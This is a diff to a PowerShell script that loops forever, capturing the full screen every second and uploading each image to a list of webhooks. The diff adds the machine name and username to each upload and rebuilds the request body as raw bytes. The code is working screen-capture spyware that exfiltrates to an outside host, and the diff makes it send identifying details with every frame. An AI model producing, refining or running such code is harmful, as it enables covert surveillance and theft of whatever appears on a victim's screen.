@@ -16,10 +16,9 @@ if (-not (Test-Path $tempDir)) {
     New-Item -Path $tempDir -ItemType Directory | Out-Null
 }
 
-while ($true) {
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $LF = "`r`n"
+$username = "$($env:COMPUTERNAME) | $($env:USERNAME)"
 
+while ($true) {
     $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
     $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
     $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
@@ -32,20 +31,40 @@ while ($true) {
     $bitmap.Dispose()
 
     $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
-    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)
+    $fileName = [System.IO.Path]::GetFileName($filePath)
 
-    $body = @(
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"file`"; filename=`"VirtualScreen.jpg`"",
-        "Content-Type: image/jpeg$LF",
-        $fileEnc,
-        "--$boundary--$LF"
-    ) -join $LF
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $LF = "`r`n"
+
+    $payload = @{
+        username = $username
+    } | ConvertTo-Json -Compress
+
+    $bodyPrefix = (
+        "--$boundary$LF" +
+        "Content-Disposition: form-data; name=`"payload_json`"$LF$LF" +
+        "$payload$LF" +
+        "--$boundary$LF" +
+        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
+        "Content-Type: application/octet-stream$LF$LF"
+    )
+
+    $bodyPrefixBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyPrefix)
+    $bodySuffixBytes = [System.Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")
+
+    $bodyBytes = New-Object byte[] ($bodyPrefixBytes.Length + $fileBytes.Length + $bodySuffixBytes.Length)
+    [Array]::Copy($bodyPrefixBytes, 0, $bodyBytes, 0, $bodyPrefixBytes.Length)
+    [Array]::Copy($fileBytes, 0, $bodyBytes, $bodyPrefixBytes.Length, $fileBytes.Length)
+    [Array]::Copy($bodySuffixBytes, 0, $bodyBytes, $bodyPrefixBytes.Length + $fileBytes.Length, $bodySuffixBytes.Length)
+
+    $headers = @{
+        "Content-Type" = "multipart/form-data; boundary=$boundary"
+    }
 
     $sent = $false
     foreach ($webhook in $webhooks) {
         try {
-            Invoke-RestMethod -Uri $webhook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -TimeoutSec 5
+            Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyBytes -Headers $headers -TimeoutSec 5
             $sent = $true
             break
         } catch {
@@ -53,9 +72,7 @@ while ($true) {
         }
     }
 
-    if (-not $sent) {
-        Write-Host "All webhooks failed for this frame."
-    }
+    if (-not $sent) { Write-Host "All webhooks failed for this frame." }
 
     Start-Sleep -Seconds 1
 }
